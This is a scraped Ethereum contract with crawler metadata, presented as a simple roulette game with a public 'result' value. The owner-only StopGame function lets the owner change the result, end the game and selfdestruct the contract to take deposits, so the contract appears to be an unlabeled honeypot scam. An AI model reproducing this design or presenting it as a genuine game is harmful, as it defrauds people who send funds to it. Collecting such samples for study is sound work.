//token_name	
//token_url	https://etherscan.io//address/0x197803b104641fbf6e206a425d9dc35dadc4f62f#code
//spider_time	2018/07/08 11:18:55
//token_Transactions	4 txns
//token_price	

pragma solidity ^0.4.20;

contract R
{

    uint8 public result = 0;

    bool finished = false;

    address rouletteOwner;

    function Play(uint8 _number)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(result == _number && msg.value>0.1 ether && !finished)
        {
            msg.sender.transfer(this.balance);
            GiftHasBeenSent();
        }
    }

    function StartRoulette(uint8 _number)
    public
    payable
    {
        if(result==0)
        {
            result = _number;
            rouletteOwner = msg.sender;
        }
    }

    function StopGame(uint8 _number)
    public
    payable
    {
        require(msg.sender == rouletteOwner);
        GiftHasBeenSent();
        result = _number;
        if (msg.value>0.08 ether){
            selfdestruct(rouletteOwner);
        }
    }

    function GiftHasBeenSent()
    private
    {
        finished = true;
    }

    function() public payable{}
}